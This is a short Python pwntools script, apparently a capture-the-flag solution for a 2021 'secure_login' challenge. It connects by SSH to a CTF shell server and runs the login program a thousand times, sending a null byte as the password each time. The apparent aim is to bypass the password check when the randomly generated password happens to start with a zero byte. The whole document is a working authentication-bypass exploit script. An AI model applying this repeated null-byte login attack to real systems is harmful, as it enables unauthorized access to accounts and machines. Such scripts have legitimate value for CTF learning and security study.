from pwn import *

#connection
conn = ssh(host='shell.actf.co', user='team', password='pw')
conn = conn.shell('/bin/bash')
conn.sendline('cd /problems/2021/secure_login')

#waiting for the magic
for x in range(1000):
	conn.sendline('./login')
	conn.recvuntil(': ')
	conn.sendline(b'\x00')
	print(conn.recvline())

conn.interactive()
conn.close()